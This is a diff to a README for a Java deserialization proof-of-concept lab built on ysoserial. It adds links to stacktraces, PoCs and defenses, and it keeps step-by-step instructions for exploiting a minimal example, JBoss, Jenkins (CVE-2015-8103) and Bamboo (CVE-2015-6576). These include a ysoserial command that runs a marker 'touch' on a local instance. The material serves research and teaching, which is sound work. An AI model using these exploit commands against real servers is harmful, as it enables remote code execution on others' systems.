@@ -1,7 +1,27 @@
 Here there are practical example of the vulnerability when deserializing objects from untrusted sources.
 This use the ysoserial tool to generate exploits.
 
-Minimal Example
+Stacktraces
+--------------------
+https://github.com/EdoardoVignati/ysoserial/tree/master/analyze
+
+See the webpage on https://rawgit.com/EdoardoVignati/ysoserial/master/analyze/index.html
+
+POCs
+-------------------
+https://github.com/EdoardoVignati/java-deserialization-of-untrusted-data-poc
+
+
+References and readings
+------------------------
+https://github.com/EdoardoVignati/ysoserial/blob/master/biblio.bib
+
+Defenses
+-------------
+https://link.springer.com/chapter/10.1007/978-3-030-00470-5_21
+
+
+#Minimal Example
 ---------------------------------
 - Use java 8
 - cd MinimalExample
@@ -13,7 +33,7 @@ Minimal Example
 - java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingObject 
 - You will find a file "pwned" in /tmp. This means that the attack has been completed correctly with a RCE.
 
-JBOSS (CVE)
+#JBOSS (CVE)
 ---------------------------------
 
 
@@ -28,11 +48,8 @@ JBOSS (CVE)
 - Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"
 
 
-References:
 
-
-
-Jenkins (CVE-2015-8103)
+#Jenkins (CVE-2015-8103)
 ---------------------------------
 
 - Download a vulnerable version of Jenkins (in this case you can find the v1.649
@@ -40,11 +57,9 @@ Jenkins (CVE-2015-8103)
 - java -jar ./jenkins-war-1.649.war
 - java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"
 
-References:
 
 
-
-Bamboo (CVE-2015-6576)
+#Bamboo (CVE-2015-6576)
 ---------------------------------
 
 - Download and install openjdk 1.7
@@ -63,6 +78,6 @@ Bamboo (CVE-2015-6576)
 
 
 
-References:
+Other references:
 https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
 https://askubuntu.com/questions/761127/how-do-i-install-openjdk-7-on-ubuntu-16-04-or-higher
